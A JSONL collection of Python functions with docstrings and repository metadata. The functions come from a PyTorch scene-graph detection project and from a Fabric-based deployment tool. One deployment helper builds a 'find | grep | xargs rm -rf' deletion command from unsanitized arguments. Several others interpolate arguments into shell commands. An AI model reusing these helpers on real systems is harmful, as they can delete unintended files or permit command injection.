meters.time.global_avg * (max_iter - i)\n    eta_string = str(datetime.timedelta(seconds=int(eta_seconds)))\n\n    if i % 20 == 0 or i == max_iter:\n        logger.info(\n            meters.delimiter.join(\n                [\n                    \"model: {tag}\",\n                    \"eta: {eta}\",\n                    \"iter: {iter}/{max_iter}\",\n                    \"{meters}\",\n                    \"lr: {lr:.6f}\",\n                    \"max mem: {memory:.0f}\",\n                ]\n            ).format(\n                tag=\"scene_parser\",\n                eta=eta_string,\n                iter=i, max_iter=max_iter,\n                meters=str(meters),\n                lr=self.sp_optimizer.param_groups[0][\"lr\"],\n                memory=torch.cuda.max_memory_allocated() / 1024.0 / 1024.0,\n            )\n        )\n    if (i + 1) % self.cfg.SOLVER.CHECKPOINT_PERIOD == 0:\n        self.sp_checkpointer.save(\"checkpoint_{:07d}\".format(i), **self.arguments)\n    if (i + 1) == max_iter:\n        self.sp_checkpointer.save(\"checkpoint_final\", **self.arguments)", "path": "lib\\model.py", "repo_name": "jwyang/graph-rcnn.pytorch", "stars": 695, "license": "None", "language": "python", "size": 1482}
{"docstring": "\"\"\"\nArguments:\n    images (ImageList): images for which we want to compute the predictions\n    features (list[Tensor]): features computed from the images that are\n        used for computing the predictions. Each tensor in the list\n        correspond to different feature levels\n    targets (list[BoxList): ground-truth boxes present in the image (optional)\n\nReturns:\n    boxes (list[BoxList]): the predicted boxes from the RPN, one BoxList per\n        image.\n    losses (dict[Tensor]): the losses for the model during training. During\n        testing, it is an empty dict.\n\"\"\"\n", "func_signal": "def forward(self, images, features, targets=None):\n", "code": "objectness, rpn_box_regression = self.head(features)\nanchors = self.anchor_generator(images, features)\n\nif self.training:\n    return self._forward_train(anchors, objectness, rpn_box_regression, targets)\nelse:\n    return self._forward_test(anchors, objectness, rpn_box_regression)", "path": "lib\\scene_parser\\rcnn\\modeling\\rpn\\rpn.py", "repo_name": "jwyang/graph-rcnn.pytorch", "stars": 695, "license": "None", "language": "python", "size": 1482}
{"docstring": "\"\"\"\nReturns a resized copy of this bounding box\n\n:param size: The requested size in pixels, as a 2-tuple:\n    (width, height).\n\"\"\"\n\n", "func_signal": "def resize(self, size, *args, **kwargs):\n", "code": "ratios = tuple(float(s) / float(s_orig) for s, s_orig in zip(size, self.size))\nif ratios[0] == ratios[1]:\n    ratio = ratios[0]\n    scaled_box = self.bbox * ratio\n    bbox = BoxPairList(scaled_box, size, mode=self.mode)\n    # bbox._copy_extra_fields(self)\n    for k, v in self.extra_fields.items():\n        if not isinstance(v, torch.Tensor):\n            v = v.resize(size, *args, **kwargs)\n        bbox.add_field(k, v)\n    return bbox\n\nratio_width, ratio_height = ratios\nxmin, ymin, xmax, ymax = self._split_into_xyxy()\nscaled_xmin = xmin * ratio_width\nscaled_xmax = xmax * ratio_width\nscaled_ymin = ymin * ratio_height\nscaled_ymax = ymax * ratio_height\nscaled_box = torch.cat(\n    (scaled_xmin, scaled_ymin, scaled_xmax, scaled_ymax), dim=-1\n)\nbbox = BoxPairList(scaled_box, size, mode=\"xyxy\")\n# bbox._copy_extra_fields(self)\nfor k, v in self.extra_fields.items():\n    if not isinstance(v, torch.Tensor):\n        v = v.resize(size, *args, **kwargs)\n    bbox.add_field(k, v)\n\nreturn bbox.convert(self.mode)", "path": "lib\\scene_parser\\rcnn\\structures\\bounding_box_pair.py", "repo_name": "jwyang/graph-rcnn.pytorch", "stars": 695, "license": "None", "language": "python", "size": 1482}
{"docstring": "# Cast all fixed parameters to half() if necessary\n", "func_signal": "def forward(self, x):\n", "code": "if x.dtype == torch.float16:\n    self.weight = self.weight.half()\n    self.bias = self.bias.half()\n    self.running_mean = self.running_mean.half()\n    self.running_var = self.running_var.half()\n\nscale = self.weight * self.running_var.rsqrt()\nbias = self.bias - self.running_mean * scale\nscale = scale.reshape(1, -1, 1, 1)\nbias = bias.reshape(1, -1, 1, 1)\nreturn x * scale + bias", "path": "lib\\scene_parser\\rcnn\\layers\\batch_norm.py", "repo_name": "jwyang/graph-rcnn.pytorch", "stars": 695, "license": "None", "language": "python", "size": 1482}
{"docstring": "\"\"\"\nCrops a rectangular region from this bounding box. The box is a\n4-tuple defining the left, upper, right, and lower pixel\ncoordinate.\n\"\"\"\n", "func_signal": "def crop(self, box):\n", "code": "xmin, ymin, xmax, ymax = self._split_into_xyxy()\nw, h = box[2] - box[0], box[3] - box[1]\ncropped_xmin = (xmin - box[0]).clamp(min=0, max=w)\ncropped_ymin = (ymin - box[1]).clamp(min=0, max=h)\ncropped_xmax = (xmax - box[0]).clamp(min=0, max=w)\ncropped_ymax = (ymax - box[1]).clamp(min=0, max=h)\n\n# TODO should I filter empty boxes here?\nif False:\n    is_empty = (cropped_xmin == cropped_xmax) | (cropped_ymin == cropped_ymax)\n\ncropped_box = torch.cat(\n    (cropped_xmin, cropped_ymin, cropped_xmax, cropped_ymax), dim=-1\n)\nbbox = BoxPairList(cropped_box, (w, h), mode=\"xyxy\")\n# bbox._copy_extra_fields(self)\nfor k, v in self.extra_fields.items():\n    if not isinstance(v, torch.Tensor):\n        v = v.crop(box)\n    bbox.add_field(k, v)\nreturn bbox.convert(self.mode)", "path": "lib\\scene_parser\\rcnn\\structures\\bounding_box_pair.py", "repo_name": "jwyang/graph-rcnn.pytorch", "stars": 695, "license": "None", "language": "python", "size": 1482}
{"docstring": "# FIXME remove check once we have better integration with device\n# in my version this would consistently return a CPU tensor\n", "func_signal": "def __init__(self, keypoints, size, mode=None):\n", "code": "device = keypoints.device if isinstance(keypoints, torch.Tensor) else torch.device('cpu')\nkeypoints = torch.as_tensor(keypoints, dtype=torch.float32, device=device)\nnum_keypoints = keypoints.shape[0]\nif num_keypoints:\n    keypoints = keypoints.view(num_keypoints, -1, 3)\n\n# TODO should I split them?\n# self.visibility = keypoints[..., 2]\nself.keypoints = keypoints# [..., :2]\n\nself.size = size\nself.mode = mode\nself.extra_fields = {}", "path": "lib\\scene_parser\\rcnn\\structures\\keypoint.py", "repo_name": "jwyang/graph-rcnn.pytorch", "stars": 695, "license": "None", "language": "python", "size": 1482}
{"docstring": "\"\"\"\nmain body for testing scene graph generation model\n\"\"\"\n", "func_signal": "def test(self, timer=None, visualize=False):\n", "code": "logger = logging.getLogger(\"scene_graph_generation.inference\")\nlogger.info(\"Start evaluating\")\nself.scene_parser.eval()\ntargets_dict = {}\nresults_dict = {}\nif self.cfg.MODEL.RELATION_ON:\n    results_pred_dict = {}\ncpu_device = torch.device(\"cpu\")\ntotal_timer = Timer()\ninference_timer = Timer()\ntotal_timer.tic()\nreg_recalls = []\nfor i, data in enumerate(self.data_loader_test, 0):\n    imgs, targets, image_ids = data\n    imgs = imgs.to(self.device); targets = [target.to(self.device) for target in targets]\n    if i % 10 == 0:\n        logger.info(\"inference on batch {}/{}...\".format(i, len(self.data_loader_test)))\n    with torch.no_grad():\n        if timer:\n            timer.tic()\n        output = self.scene_parser(imgs)\n        if self.cfg.MODEL.RELATION_ON:\n            output, output_pred = output\n            output_pred = [o.to(cpu_device) for o in output_pred]\n        ious = bbox_overlaps(targets[0].bbox, output[0].bbox)\n        reg_recall = (ious.max(1)[0] > 0.5).sum().item() / ious.shape[0]\n        reg_recalls.append(reg_recall)\n        if timer:\n            torch.cuda.synchronize()\n            timer.toc()\n        output = [o.to(cpu_device) for o in output]\n        if visualize:\n            self.visualize_detection(self.data_loader_test.dataset, image_ids, imgs, output)\n    results_dict.update(\n        {img_id: result for img_id, result in zip(image_ids, output)}\n    )\n    targets_dict.update(\n        {img_id: target for img_id, target in zip(image_ids, targets)}\n    )\n    if self.cfg.MODEL.RELATION_ON:\n        results_pred_dict.update(\n            {img_id: result for img_id, result in zip(image_ids, output_pred)}\n        )\n    if self.cfg.instance > 0 and i > self.cfg.instance:\n        break\nsynchronize()\ntotal_time = total_timer.toc()\ntotal_time_str = get_time_str(total_time)\nnum_devices = get_world_size()\nlogger.info(\n    \"Total run time: {} ({} s / img per device, on {} devices)\".format(\n        total_time_str, total_time * num_devices / len(self.data_loader_test.dataset), num_devices\n    )\n)\ntotal_infer_time = get_time_str(inference_timer.total_time)\nlogger.info(\n    \"Model inference time: {} ({} s / img per device, on {} devices)\".format(\n        total_infer_time,\n        inference_timer.total_time * num_devices / len(self.data_loader_test.dataset),\n        num_devices,\n    )\n)\npredictions = self._accumulate_predictions_from_multiple_gpus(results_dict)\nif self.cfg.MODEL.RELATION_ON:\n    predictions_pred = self._accumulate_predictions_from_multiple_gpus(results_pred_dict)\nif not is_main_process():\n    return\n\noutput_folder = \"results\"\nif output_folder:\n    if not os.path.exists(output_folder):\n        os.mkdir(output_folder)\n    torch.save(predictions, os.path.join(output_folder, \"predictions.pth\"))\n    if self.cfg.MODEL.RELATION_ON:\n        torch.save(predictions_pred, os.path.join(output_folder, \"predictions_pred.pth\"))\n\nextra_args = dict(\n    box_only=False if self.cfg.MODEL.RETINANET_ON else self.cfg.MODEL.RPN_ONLY,\n    iou_types=(\"bbox\",),\n    expected_results=self.cfg.TEST.EXPECTED_RESULTS,\n    expected_results_sigma_tol=self.cfg.TEST.EXPECTED_RESULTS_SIGMA_TOL,\n)\neval_det_results = evaluate(dataset=self.data_loader_test.dataset,\n                predictions=predictions,\n                output_folder=output_folder,\n                **extra_args)\n\nif self.cfg.MODEL.RELATION_ON:\n    eval_sg_results = evaluate_sg(dataset=self.data_loader_test.dataset,\n                    predictions=predictions,\n                    predictions_pred=predictions_pred,\n                    output_folder=output_folder,\n                    **extra_args)", "path": "lib\\model.py", "repo_name": "jwyang/graph-rcnn.pytorch", "stars": 695, "license": "None", "language": "python", "size": 1482}
{"docstring": "# assert isinstance(dataset, COCODataset)\n", "func_signal": "def prepare_for_gqa_coco_detection(predictions, dataset):\n", "code": "gqa_coco_results = []\nfor image_id, prediction in enumerate(predictions):\n    original_id = dataset.id_to_img_map[image_id]\n    if len(prediction) == 0:\n        continue\n\n    img_info = dataset.get_img_info(image_id)\n    image_width = img_info[\"width\"]\n    image_height = img_info[\"height\"]\n    prediction = prediction.resize((image_width, image_height))\n    prediction = prediction.convert(\"xywh\")\n\n    boxes = prediction.bbox.tolist()\n    scores = prediction.get_field(\"scores\").tolist()\n    labels = prediction.get_field(\"labels\").tolist()\n\n    mapped_labels = [dataset.contiguous_category_id_to_json_id[i] for i in labels]\n\n    gqa_coco_results.extend(\n        [\n            {\n                \"image_id\": original_id,\n                \"category_id\": mapped_labels[k],\n                \"bbox\": box,\n                \"score\": scores[k],\n            }\n            for k, box in enumerate(boxes)\n        ]\n    )\nreturn gqa_coco_results", "path": "lib\\data\\evaluation\\gqa_coco\\gqa_coco_eval.py", "repo_name": "jwyang/graph-rcnn.pytorch", "stars": 695, "license": "None", "language": "python", "size": 1482}
{"docstring": "\"\"\"\ninitialize scene graph generation model\n\"\"\"\n", "func_signal": "def __init__(self, cfg, arguments, local_rank, distributed):\n", "code": "self.cfg = cfg\nself.arguments = arguments.copy()\nself.device = torch.device(\"cuda\")\n\n# build data loader\nself.data_loader_train = build_data_loader(cfg, split=\"train\", is_distributed=distributed)\nself.data_loader_test = build_data_loader(cfg, split=\"test\", is_distributed=distributed)\n\ncfg.DATASET.IND_TO_OBJECT = self.data_loader_train.dataset.ind_to_classes\ncfg.DATASET.IND_TO_PREDICATE = self.data_loader_train.dataset.ind_to_predicates\n\nlogger = logging.getLogger(\"scene_graph_generation.trainer\")\nlogger.info(\"Train data size: {}\".format(len(self.data_loader_train.dataset)))\nlogger.info(\"Test data size: {}\".format(len(self.data_loader_test.dataset)))\n\nif not os.path.exists(\"freq_prior.npy\"):\n    logger.info(\"Computing frequency prior matrix...\")\n    fg_matrix, bg_matrix = self._get_freq_prior()\n    prob_matrix = fg_matrix.astype(np.float32)\n    prob_matrix[:,:,0] = bg_matrix\n\n    prob_matrix[:,:,0] += 1\n    prob_matrix /= np.sum(prob_matrix, 2)[:,:,None]\n    # prob_matrix /= float(fg_matrix.max())\n    np.save(\"freq_prior.npy\", prob_matrix)\n\n# build scene graph generation model\nself.scene_parser = build_scene_parser(cfg); self.scene_parser.to(self.device)\nself.sp_optimizer, self.sp_scheduler, self.sp_checkpointer, self.extra_checkpoint_data = \\\n    build_scene_parser_optimizer(cfg, self.scene_parser, local_rank=local_rank, distributed=distributed)\n\nself.arguments.update(self.extra_checkpoint_data)", "path": "lib\\model.py", "repo_name": "jwyang/graph-rcnn.pytorch", "stars": 695, "license": "None", "language": "python", "size": 1482}
{"docstring": "\"\"\"\nArguments:\n    anchors (list[BoxList])\n    objectness (list[Tensor])\n    box_regression (list[Tensor])\n    targets (list[BoxList])\n\nReturns:\n    objectness_loss (Tensor)\n    box_loss (Tensor\n\"\"\"\n", "func_signal": "def __call__(self, anchors, objectness, box_regression, targets):\n", "code": "anchors = [cat_boxlist(anchors_per_image) for anchors_per_image in anchors]\nlabels, regression_targets = self.prepare_targets(anchors, targets)\nsampled_pos_inds, sampled_neg_inds = self.fg_bg_sampler(labels)\nsampled_pos_inds = torch.nonzero(torch.cat(sampled_pos_inds, dim=0)).squeeze(1)\nsampled_neg_inds = torch.nonzero(torch.cat(sampled_neg_inds, dim=0)).squeeze(1)\n\nsampled_inds = torch.cat([sampled_pos_inds, sampled_neg_inds], dim=0)\n\nobjectness, box_regression = \\\n        concat_box_prediction_layers(objectness, box_regression)\n\nobjectness = objectness.squeeze()\n\nlabels = torch.cat(labels, dim=0)\nregression_targets = torch.cat(regression_targets, dim=0)\n\nbox_loss = smooth_l1_loss(\n    box_regression[sampled_pos_inds],\n    regression_targets[sampled_pos_inds],\n    beta=1.0 / 9,\n    size_average=False,\n) / (sampled_inds.numel())\n\nobjectness_loss = F.binary_cross_entropy_with_logits(\n    objectness[sampled_inds], labels[sampled_inds]\n)\n\nreturn objectness_loss, box_loss", "path": "lib\\scene_parser\\rcnn\\modeling\\rpn\\loss.py", "repo_name": "jwyang/graph-rcnn.pytorch", "stars": 695, "license": "None", "language": "python", "size": 1482}
{"docstring": "\"\"\" Only include boxes that overlap as possible relations.\nIf no overlapping boxes, use all of them.\"\"\"\n", "func_signal": "def _box_filter(self, boxes, must_overlap=False):\n", "code": "n_cands = boxes.shape[0]\n\noverlaps = bbox_overlaps(torch.from_numpy(boxes.astype(np.float)), torch.from_numpy(boxes.astype(np.float))).numpy() > 0\nnp.fill_diagonal(overlaps, 0)\n\nall_possib = np.ones_like(overlaps, dtype=np.bool)\nnp.fill_diagonal(all_possib, 0)\n\nif must_overlap:\n    possible_boxes = np.column_stack(np.where(overlaps))\n\n    if possible_boxes.size == 0:\n        possible_boxes = np.column_stack(np.where(all_possib))\nelse:\n    possible_boxes = np.column_stack(np.where(all_possib))\nreturn possible_boxes", "path": "lib\\model.py", "repo_name": "jwyang/graph-rcnn.pytorch", "stars": 695, "license": "None", "language": "python", "size": 1482}
{"docstring": "\"\"\"\nArguments:\n    cfg              : config\n    in_channels (int): number of channels of the input feature\n    num_anchors (int): number of anchors to be predicted\n\"\"\"\n", "func_signal": "def __init__(self, cfg, in_channels, num_anchors):\n", "code": "super(RPNHeadConvRegressor, self).__init__()\nself.cls_logits = nn.Conv2d(in_channels, num_anchors, kernel_size=1, stride=1)\nself.bbox_pred = nn.Conv2d(\n    in_channels, num_anchors * 4, kernel_size=1, stride=1\n)\n\nfor l in [self.cls_logits, self.bbox_pred]:\n    torch.nn.init.normal_(l.weight, std=0.01)\n    torch.nn.init.constant_(l.bias, 0)", "path": "lib\\scene_parser\\rcnn\\modeling\\rpn\\rpn.py", "repo_name": "jwyang/graph-rcnn.pytorch", "stars": 695, "license": "None", "language": "python", "size": 1482}
{"docstring": "# Detectron C2 models are stored following the structure\n# prefix/<model_id>/2012_2017_baselines/<model_name>.yaml.<signature>/suffix\n# we use as identifiers in the catalog Caffe2Detectron/COCO/<model_id>/<model_name>\n", "func_signal": "def get_c2_detectron_12_2017_baselines(name):\n", "code": "prefix = ModelCatalog.S3_C2_DETECTRON_URL\ndataset_tag = \"keypoints_\" if \"keypoint\" in name else \"\"\nsuffix = ModelCatalog.C2_DETECTRON_SUFFIX.format(dataset_tag, dataset_tag)\n# remove identification prefix\nname = name[len(\"Caffe2Detectron/COCO/\"):]\n# split in <model_id> and <model_name>\nmodel_id, model_name = name.split(\"/\")\n# parsing to make it match the url address from the Caffe2 models\nmodel_name = \"{}.yaml\".format(model_name)\nsignature = ModelCatalog.C2_DETECTRON_MODELS[name]\nunique_name = \".\".join([model_name, signature])\nurl = \"/\".join([prefix, model_id, \"12_2017_baselines\", unique_name, suffix])\nreturn url", "path": "lib\\scene_parser\\rcnn\\config\\paths_catalog.py", "repo_name": "jwyang/graph-rcnn.pytorch", "stars": 695, "license": "None", "language": "python", "size": 1482}
{"docstring": "\"\"\"\nArguments:\n    cfg              : config\n    in_channels (int): number of channels of the input feature\n\"\"\"\n", "func_signal": "def __init__(self, cfg, in_channels):\n", "code": "super(RPNHeadFeatureSingleConv, self).__init__()\nself.conv = nn.Conv2d(\n    in_channels, in_channels, kernel_size=3, stride=1, padding=1\n)\n\nfor l in [self.conv]:\n    torch.nn.init.normal_(l.weight, std=0.01)\n    torch.nn.init.constant_(l.bias, 0)\n\nself.out_channels = in_channels", "path": "lib\\scene_parser\\rcnn\\modeling\\rpn\\rpn.py", "repo_name": "jwyang/graph-rcnn.pytorch", "stars": 695, "license": "None", "language": "python", "size": 1482}
{"docstring": "# assert isinstance(dataset, COCODataset)\n", "func_signal": "def prepare_for_coco_detection(predictions, dataset):\n", "code": "coco_results = []\nfor image_id, prediction in enumerate(predictions):\n    original_id = dataset.id_to_img_map[image_id]\n    if len(prediction) == 0:\n        continue\n\n    img_info = dataset.get_img_info(image_id)\n    image_width = img_info[\"width\"]\n    image_height = img_info[\"height\"]\n    prediction = prediction.resize((image_width, image_height))\n    prediction = prediction.convert(\"xywh\")\n\n    boxes = prediction.bbox.tolist()\n    scores = prediction.get_field(\"scores\").tolist()\n    labels = prediction.get_field(\"labels\").tolist()\n\n    mapped_labels = [dataset.contiguous_category_id_to_json_id[i] for i in labels]\n\n    coco_results.extend(\n        [\n            {\n                \"image_id\": original_id,\n                \"category_id\": mapped_labels[k],\n                \"bbox\": box,\n                \"score\": scores[k],\n            }\n            for k, box in enumerate(boxes)\n        ]\n    )\nreturn coco_results", "path": "lib\\scene_parser\\rcnn\\data\\datasets\\evaluation\\coco\\coco_eval.py", "repo_name": "jwyang/graph-rcnn.pytorch", "stars": 695, "license": "None", "language": "python", "size": 1482}
{"docstring": "\"\"\"\nThis gives the gist of it. Not super important because it doesn't change as much\n\"\"\"\n", "func_signal": "def build_rpn(cfg, in_channels):\n", "code": "if cfg.MODEL.RETINANET_ON:\n    return build_retinanet(cfg, in_channels)\n\nreturn RPNModule(cfg, in_channels)", "path": "lib\\scene_parser\\rcnn\\modeling\\rpn\\rpn.py", "repo_name": "jwyang/graph-rcnn.pytorch", "stars": 695, "license": "None", "language": "python", "size": 1482}
{"docstring": "\"\"\"\n    \u628a\u9879\u76eeclone\u5230\u672c\u5730\n\"\"\"\n\n", "func_signal": "def clone(project_name, in_local=False, git_path=None):\n", "code": "if env.GIT_SERVER.startswith('http'):\n    cmd = 'git clone %s/%s' % (env.GIT_SERVER, project_name)\nelse:\n    cmd = 'git clone git@%s:%s' % (env.GIT_SERVER, project_name)\ncommand(cmd, in_local, git_path)", "path": "essay\\tasks\\git.py", "repo_name": "SohuTech/essay", "stars": 537, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"\n\u91cd\u542f\u6307\u5b9a\u865a\u62df\u73af\u5883\u7684supervisor\nvenv_dir \u6307\u5b9a\u865a\u62df\u73af\u5883\u5730\u5740\nretry \u5f53\u524d\u91cd\u8bd5\u6b21\u6570\nretry_interval \u591a\u5c11\u79d2\u540e\u5f00\u59cb\u91cd\u8bd5\nmax_retries \u6700\u5927\u91cd\u8bd5\u6b21\u6570\n\"\"\"\n\n", "func_signal": "def start(venv_dir=None, retry=0, retry_interval=2, max_retries=3):\n", "code": "if retry > max_retries:\n    print(red('start supervisord FAIL!'))\n    return\n\nif venv_dir:\n    with virtualenv.activate(venv_dir):\n        start()\n\nif 'CURRENT_VIRTUAL_ENV_DIR' not in env:\n    raise Exception('\u53ea\u53ef\u4ee5\u5728\u865a\u62df\u73af\u5883\u5b89\u88c5Python\u5305')\n\nvenv_dir = env.CURRENT_VIRTUAL_ENV_DIR\n\nwith settings(warn_only=True), cd(venv_dir):\n    # \u505c\u6b62supervisor\u7ba1\u7406\u7684\u8fdb\u7a0b\n    result = run('bin/supervisord -c etc/supervisord.conf ')\n    if result:\n        retry += 1\n        print(green('start supervisord fail, retry[{}]'.format(retry)))\n        start(retry=retry, retry_interval=retry_interval, max_retries=max_retries)", "path": "essay\\tasks\\supervisor.py", "repo_name": "SohuTech/essay", "stars": 537, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"\n\u6253\u5305\n\n\u53c2\u6570:\n    name: \u63cf\u8ff0, \u5982:seo\u3002\u6700\u540e\u751f\u6210project_name-x.x.x.x-seo.tar.gz\n    commit: \u6307\u5b9acommit\u7248\u672c\n    branch: \u5206\u652f\u540d\u79f0\n    version: \u81ea\u5b9a\u4e49\u7248\u672c\u53f7\uff0c\u5982\u679c\u4e3aNone\u5219\u6839\u636e\u65e5\u671f\u751f\u6210\n\ncommit\u548cbranch\u5fc5\u987b\u63d0\u4f9b\u4e00\u4e2a, \u6216\u8005\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\n\"\"\"\n\n", "func_signal": "def build(name=None, version=None, commit=None, branch=None):\n", "code": "if commit:\n    check_out = commit\nelif branch:\n    check_out = branch\nelse:\n    check_out = env.DEFAULT_BRANCH\n\nif not version:\n    config.check('PROJECT')\n    version = get_next_version(env.PROJECT)\n\nif name:\n    version = '%s-%s' % (version, name)\n\nproject_path = os.path.join(env.BUILD_PATH, env.PROJECT)\n\nif not files.exists(project_path):\n    with(cd(env.BUILD_PATH)):\n        git.clone('/'.join([env.PROJECT_OWNER, env.PROJECT]))\n\nwith(cd(project_path)):\n    git.checkout(check_out)\n    # \u5728setup\u6253\u5305\u4e4b\u524d\u505a\u8fdb\u4e00\u6b65\u6570\u636e\u51c6\u5907\u5de5\u4f5c\u7684hook\n    if hasattr(env, 'PRE_BUILD_HOOK'):\n        env.PRE_BUILD_HOOK()\n\n    params = {\n        'release_time': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),\n        'git_version': git.get_version(),\n        'version': version,\n    }\n\n    fs.inplace_render(os.path.join(project_path, 'setup.py'), params)\n\n    if hasattr(env, 'SETTINGS_BASE_FILE'):\n        settings_file_path = os.path.join(project_path, *env.SETTINGS_BASE_FILE.split('/'))\n    else:\n        settings_file_path = os.path.join(project_path, env.PROJECT, 'settings.py')\n        if not files.exists(settings_file_path):\n            settings_file_path = os.path.join(project_path, env.PROJECT, 'settings', '__init__.py')\n\n    if files.exists(settings_file_path):\n        fs.inplace_render(settings_file_path, params)\n\n    run(\"python setup.py sdist bdist_wheel upload -r internal\")", "path": "essay\\tasks\\build.py", "repo_name": "SohuTech/essay", "stars": 537, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"\u8ba1\u7b97\u4e0b\u4e00\u4e2a\u7248\u672c\u53f7\"\"\"\n\n", "func_signal": "def get_next_version(package_name=None):\n", "code": "if not package_name:\n    config.check('PROJECT')\n    package_name = env.PROJECT\n\nnow = datetime.datetime.now()\nprefix = '%s.%s.%s' % (str(now.year)[-1], now.month, now.day)\n\nlatest_version = get_latest_version(package_name)\n# \u5982\u679c\u8be5\u9879\u76ee\u6ca1\u6709\u5efa\u7acb\u8fc7\u7248\u672c,\u4ece1\u5f00\u59cb\nif not latest_version:\n    index = 1\nelse:\n    last_prefix, last_index = latest_version.rsplit('.', 1)\n\n    if last_prefix != prefix:\n        index = 1\n    else:\n        index = int(last_index) + 1\n\nversion = prefix + '.' + str(index)\nprint('next version is: {}'.format(version))\n\nreturn version", "path": "essay\\tasks\\build.py", "repo_name": "SohuTech/essay", "stars": 537, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\" \u53d1\u5e03\u6307\u5b9a\u7684\u7248\u672c\uff0c\u4f1a\u81ea\u52a8\u5b89\u88c5\u9879\u76ee\u8fd0\u884c\u6240\u9700\u8981\u7684\u5305\n\n    version\uff1abuild\u4e4b\u540e\u7684\u7248\u672c\n    venv_dir\uff1a\u865a\u62df\u73af\u5883\u540d\u79f0\n    profile\uff1aprofile\u53c2\u6570\u4f1a\u4f20\u9012\u5230supervisord.conf\u4e2d\n\"\"\"\n\n", "func_signal": "def deploy(version, venv_dir, profile):\n", "code": "if not version:\n    version = build.get_latest_version()\n\nvirtualenv.ensure(venv_dir)\n\npre_hook = getattr(env, 'DEPLOY_PRE_HOOK', None)\npost_hook = getattr(env, 'DEPLOY_POST_HOOK', None)\n\nwith virtualenv.activate(venv_dir):\n    if callable(pre_hook):\n        pre_hook(version, venv_dir, profile)\n    supervisor.ensure(project=env.PROJECT, profile=profile)\n    package.install(env.PROJECT, version)\n    supervisor.shutdown()\n    supervisor.start()\n    if callable(post_hook):\n        post_hook(version, venv_dir, profile)", "path": "essay\\tasks\\deploy.py", "repo_name": "SohuTech/essay", "stars": 537, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"\n\u6839\u636e\u8def\u5f84\u52a8\u6001\u5f15\u5165\u6a21\u5757\u5c5e\u6027\n\"\"\"\n", "func_signal": "def import_by_path(dotted_path):\n", "code": "try:\n    module_path, class_name = dotted_path.rsplit('.', 1)\nexcept ValueError:\n    raise Exception('%s\u4e0d\u662f\u4e00\u4e2a\u6709\u6548\u7684\u6a21\u5757\u8def\u5f84' % module_path)\n\ntry:\n    module = import_module(module_path)\nexcept ImportError as e:\n    raise Exception('\u6a21\u5757\u5f15\u5165\u9519\u8bef: \"%s\"' % e)\n\ntry:\n    attr = getattr(module, class_name)\nexcept AttributeError as e:\n    raise Exception('\u6a21\u5757\u5f15\u5165\u9519\u8bef: \"%s\"' % e)\n\nreturn attr", "path": "essay\\utils.py", "repo_name": "SohuTech/essay", "stars": 537, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"\n\u5220\u9664\u6307\u5b9a\u683c\u5f0f\u7684\u6587\u4ef6\n\n\u53c2\u6570:\n    directory: \u76ee\u5f55\n    pattern: \u683c\u5f0f\n    in_local: \u5728\u672c\u5730\u6267\u884c\uff08\u9ed8\u8ba4\uff09\n\n\u793a\u4f8b:\n    fab fs.rm_by_pattern:.,.pyc,True\n\"\"\"\n\n", "func_signal": "def rm_by_pattern(directory, pattern, in_local=False):\n", "code": "if in_local:\n    local('find %s |grep %s | xargs rm -rf' % (directory, pattern))\nelse:\n    run('find %s |grep %s | xargs rm -rf' % (directory, pattern))", "path": "essay\\tasks\\fs.py", "repo_name": "SohuTech/essay", "stars": 537, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"\n    \u6839\u636ecommit\u56de\u6eda\u4ee3\u7801\u6216\u8005\u83b7\u53d6\u5206\u652f\u7684\u6240\u6709\u4ee3\u7801\n\n    commit\u636e\u6709\u4f18\u5148\u6743\n\"\"\"\n\n", "func_signal": "def checkout(commit_or_branch, in_local=False, git_path=None):\n", "code": "cmd = 'git reset --hard && git fetch && git checkout %s &&\\\n    git pull && git submodule update --init --recursive' % commit_or_branch\ncommand(cmd, in_local, git_path)", "path": "essay\\tasks\\git.py", "repo_name": "SohuTech/essay", "stars": 537, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"\u521d\u59cb\u5316\u672c\u5730\u9879\u76ee\n\n\u6b64\u65b9\u6cd5\u4e0d\u9700\u8981\u8fde\u63a5git\u670d\u52a1\u5668\n\"\"\"\n", "func_signal": "def init_project(project, template='default'):\n", "code": "if project is None:\n    project_dir = path.abspath('.')\n    template = 'init'\n    project = ''\n    params = {\n        'project_name': project\n    }\nelse:\n    project_dir = path.abspath(project)\n    fs.ensure_dir(project, in_local=True)\n\n    params = {\n        'project_name': project\n    }\n\nbuild_structure(project, project_dir, params, template)", "path": "essay\\project.py", "repo_name": "SohuTech/essay", "stars": 537, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"\n\u5feb\u901f\u90e8\u7f72\n\n    $ fab -R yourroles quickdeploy:a,test,master\n\"\"\"\n\n", "func_signal": "def quickdeploy(venv_dir, profile, branch=None):\n", "code": "deploy_host_string = env.host_string\n\nbuild_host = env.roledefs.get('build')\nenv.host_string = build_host[0] if isinstance(build_host, list) else build_host\nbuild.build(branch=branch)\n\nenv.host_string = deploy_host_string\nversion = build.get_latest_version()\n\ndeploy(version, venv_dir, profile)", "path": "essay\\tasks\\deploy.py", "repo_name": "SohuTech/essay", "stars": 537, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"\n    \u628a\u9879\u76eelone\u5230\u672c\u5730\n\"\"\"\n", "func_signal": "def push(branch=None, in_local=False, git_path=None):\n", "code": "cmd = 'git push'\nif branch:\n    cmd += ' origin ' + branch\ncommand(cmd, in_local, git_path)", "path": "essay\\tasks\\git.py", "repo_name": "SohuTech/essay", "stars": 537, "license": "None", "language": "python", "size": 172}
